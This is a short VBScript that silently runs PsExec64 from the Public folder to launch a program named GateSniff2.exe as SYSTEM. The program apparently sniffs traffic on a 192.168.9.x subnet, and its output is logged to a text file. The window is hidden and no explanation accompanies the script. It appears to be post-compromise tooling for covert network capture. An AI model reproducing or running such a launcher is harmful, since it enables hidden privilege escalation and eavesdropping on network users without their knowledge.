Dim sh
Set sh = CreateObject("WScript.Shell")
sh.Run "C:\Users\Public\PsExec64.exe -accepteula -nobanner -i 1 -s C:\Users\Public\GateSniff2.exe 25 5000 192.168.9. C:\Users\Public\sniff2.txt", 0, True
WScript.Sleep 26000
